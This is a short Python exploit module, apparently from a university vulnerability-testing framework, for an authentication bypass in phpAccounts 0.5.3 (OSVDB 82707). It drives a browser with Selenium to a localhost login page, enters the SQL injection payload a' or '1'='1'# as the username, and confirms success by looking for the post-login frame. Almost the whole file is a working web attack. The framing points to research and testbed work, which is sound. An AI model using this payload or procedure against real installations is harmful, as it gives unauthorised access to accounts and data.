
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import framework                        
import time
import selenium.common.exceptions

class Exploit (framework.Exploit):
    attributes = {'Name' : "OSVDB_82707A",                        
                  'Description' : "Authentication Bypass",
                  'References' : [['OSVDB','82707'],['http://www.osvdb.org/show/osvdb/82707']],
                  'Target' : "phpAccounts 0.5.3",
                  'TargetLicense' : '',
                  'Type' : "AUTH",
                  'VulWikiPage' : "",
                  }

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        self.verified = False
        return

    def exploit(self):
        driver = self.create_selenium_driver()
        driver.get("http://127.0.0.1/phpaccounts/index.php")

        driver.get_element(by_xpath="//input[@name='Login_Username']").send_keys("a' or '1'='1'#")
        driver.get_element(by_xpath="//input[@name='Login_Password']").send_keys("anything")
        driver.get_element(by_xpath="//input[@value='Login']").click()

        try:
            driver.get_element(by_xpath="//frame[@name='leftFrame']")
            self.verified = True
        except selenium.common.exceptions.NoSuchElementException:
            self.verified = False

        driver.cleanup()
        return                

    def verify(self):
        return self.verified
